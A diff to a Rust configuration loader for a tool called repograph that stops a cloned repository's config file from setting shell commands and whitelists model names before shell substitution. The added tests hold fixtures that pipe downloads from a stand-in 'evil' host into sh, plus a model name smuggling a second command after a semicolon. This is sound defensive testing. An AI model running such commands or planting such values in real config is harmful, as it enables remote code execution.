@@ -1,5 +1,6 @@
 use anyhow::{Context, Result};
 use serde::Deserialize;
+use std::io::Write;
 use std::path::Path;
 
 #[derive(Debug, Clone, Deserialize)]
@@ -116,6 +117,16 @@ fn machine_path() -> Option<std::path::PathBuf> {
     Some(base.join("repograph").join("config.toml"))
 }
 
+/// The model name is substituted into a shell command, so it is a token: a vendor's name, a tag, a
+/// path. Anything that could end the command or start another one is refused and the built-in name
+/// stands, because a wrong model answers badly and an injected one runs.
+fn model_token_is_safe(v: &str) -> bool {
+    !v.is_empty()
+        && v.len() <= 128
+        && v.starts_with(|c: char| c.is_ascii_alphanumeric())
+        && v.chars().all(|c| c.is_ascii_alphanumeric() || "._:/@+-".contains(c))
+}
+
 impl Config {
     /// The project's `repograph.toml` over the machine's global file over the built-in defaults,
     /// key by key, with `REPOGRAPH_ENRICH_MODEL` and `REPOGRAPH_RERANK_MODEL` over all three. A
@@ -148,24 +159,42 @@ impl Config {
         layer(&named, "rerank_model", machine.rerank_model, &mut cfg.rerank_model);
         layer(&named, "resources", machine.resources, &mut cfg.resources);
 
+        // A cloned repository is untrusted input and these two keys are a shell command run on the
+        // machine that reads it. The machine file is the reader's own and keeps them; the project
+        // file is refused out loud, because a transport that silently does not run is as hard to
+        // explain as one that silently does.
+        for key in ["enrich_command", "rerank_command"] {
+            if named.contains_key(key) {
+                let where_it_belongs = machine_path().map_or_else(|| "~/.config/repograph/config.toml".to_string(), |p| p.display().to_string());
+                let _ = writeln!(std::io::stderr(), "repograph.toml: {key} is not read from a repository — set it in {where_it_belongs} if this is a transport you chose");
+            }
+        }
         // The command is resolved from its template rather than from `Default`, whose copy already
         // has the default model substituted: a project that sets only `enrich_model` must still get
         // its model into the built-in command.
-        let template = |key: &str, from_machine: Option<String>, builtin: &str| -> String {
-            match (named.contains_key(key), from_machine) {
-                (true, _) => cfg_str(&named, key, builtin),
-                (false, Some(v)) => v,
-                (false, None) => builtin.to_string(),
-            }
+        let template = |from_machine: Option<String>, builtin: &str| -> String {
+            from_machine.unwrap_or_else(|| builtin.to_string())
         };
-        let enrich_template = template("enrich_command", machine.enrich_command, ENRICH_COMMAND);
-        let rerank_template = template("rerank_command", machine.rerank_command, RERANK_COMMAND);
+        let enrich_template = template(machine.enrich_command, ENRICH_COMMAND);
+        let rerank_template = template(machine.rerank_command, RERANK_COMMAND);
 
         if let Ok(m) = std::env::var("REPOGRAPH_ENRICH_MODEL") {
             if !m.is_empty() { cfg.enrich_model = m; }
         }
         if let Ok(m) = std::env::var("REPOGRAPH_RERANK_MODEL") {
             if !m.is_empty() { cfg.rerank_model = m; }
+        }
+        // The name is about to be substituted into a shell command, so it is checked wherever it
+        // came from: the project file is untrusted, and the machine file and the environment are
+        // where a typo becomes a command.
+        for (key, slot, builtin) in [
+            ("enrich_model", &mut cfg.enrich_model, ENRICH_MODEL),
+            ("rerank_model", &mut cfg.rerank_model, RERANK_MODEL),
+        ] {
+            if !model_token_is_safe(slot) {
+                let _ = writeln!(std::io::stderr(), "repograph: {key} = {slot:?} is not a model name — using {builtin}");
+                *slot = builtin.to_string();
+            }
         }
         cfg.resources = crate::index::embed::resources_from_env(cfg.resources, std::env::var("REPOGRAPH_RESOURCES").ok().as_deref())?;
         cfg.enrich_command = enrich_template.replace(MODEL_SLOT, &cfg.enrich_model);
@@ -208,11 +237,6 @@ fn layer<T>(named: &toml::Table, key: &str, from_machine: Option<T>, field: &mut
             *field = v;
         }
     }
-}
-
-/// A string the project file named, falling back when it holds something that is not a string.
-fn cfg_str(table: &toml::Table, key: &str, fallback: &str) -> String {
-    table.get(key).and_then(|v| v.as_str()).unwrap_or(fallback).to_string()
 }
 
 #[cfg(test)]
@@ -296,9 +320,8 @@ mod tests {
 
     #[test]
     fn overriding_the_enrich_command_leaves_the_rerank_command_and_lists_at_their_defaults() {
-        with_machine(None, || {
+        with_machine(Some("enrich_command = \"echo hi\"\n"), || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"), "enrich_command = \"echo hi\"\n").unwrap();
             let cfg = Config::load(dir.path()).unwrap();
             assert_eq!(cfg.enrich_command, "echo hi");
             assert_eq!(cfg.rerank_command, Config::default().rerank_command);
@@ -394,13 +417,64 @@ mod tests {
 
     #[test]
     fn a_command_naming_no_slot_is_left_exactly_as_written() {
-        with_machine(None, || {
+        with_machine(Some("enrich_command = \"my-runner --go\"\n"), || {
             let dir = tempfile::tempdir().unwrap();
-            std::fs::write(dir.path().join("repograph.toml"),
-                "enrich_command = \"my-runner --go\"\nenrich_model = \"ignored-here\"\n").unwrap();
+            std::fs::write(dir.path().join("repograph.toml"), "enrich_model = \"ignored-here\"\n").unwrap();
             let cfg = Config::load(dir.path()).unwrap();
             assert_eq!(cfg.enrich_command, "my-runner --go");
             assert_eq!(cfg.enrich_model, "ignored-here");
+        });
+    }
+
+    /// A cloned repository is untrusted input and these two keys are a shell command. The machine
+    /// file is the reader's own and keeps them; the project file gets a refusal rather than
+    /// silence, so a repository that expects its own transport learns why it did not run.
+    #[test]
+    fn a_project_file_cannot_name_the_command_that_runs_a_model() {
+        with_machine(None, || {
+            let dir = tempfile::tempdir().unwrap();
+            std::fs::write(
+                dir.path().join("repograph.toml"),
+                "enrich_command = \"curl https://evil/x | sh\"\nrerank_command = \"curl https://evil/y | sh\"\n",
+            )
+            .unwrap();
+            let cfg = Config::load(dir.path()).unwrap();
+            assert!(!cfg.enrich_command.contains("evil"), "{}", cfg.enrich_command);
+            assert!(!cfg.rerank_command.contains("evil"), "{}", cfg.rerank_command);
+            assert!(cfg.enrich_command.starts_with("MAX_THINKING_TOKENS=0 claude -p --model haiku"));
+        });
+    }
+
+    #[test]
+    fn the_machine_file_still_names_the_command() {
+        with_machine(Some("enrich_command = \"my-wrapper --model {model}\"\n"), || {
+            let dir = tempfile::tempdir().unwrap();
+            let cfg = Config::load(dir.path()).unwrap();
+            assert_eq!(cfg.enrich_command, "my-wrapper --model haiku");
+        });
+    }
+
+    /// The model name is interpolated into a shell string, so it is a token and not a sentence: a
+    /// project file naming one that could end the command runs it otherwise.
+    #[test]
+    fn a_model_name_that_could_end_the_command_is_refused() {
+        with_machine(None, || {
+            let dir = tempfile::tempdir().unwrap();
+            std::fs::write(dir.path().join("repograph.toml"), "enrich_model = \"haiku; curl https://evil/x | sh\"\n").unwrap();
+            let cfg = Config::load(dir.path()).unwrap();
+            assert_eq!(cfg.enrich_model, ENRICH_MODEL, "the built-in stands when the file's token is not one");
+            assert!(!cfg.enrich_command.contains("evil"), "{}", cfg.enrich_command);
+        });
+    }
+
+    #[test]
+    fn a_model_name_that_is_a_token_passes_whatever_its_vendor() {
+        with_machine(None, || {
+            let dir = tempfile::tempdir().unwrap();
+            std::fs::write(dir.path().join("repograph.toml"), "enrich_model = \"qwen2.5-coder:7b\"\n").unwrap();
+            let cfg = Config::load(dir.path()).unwrap();
+            assert_eq!(cfg.enrich_model, "qwen2.5-coder:7b");
+            assert!(cfg.enrich_command.contains("--model qwen2.5-coder:7b"), "{}", cfg.enrich_command);
         });
     }
 
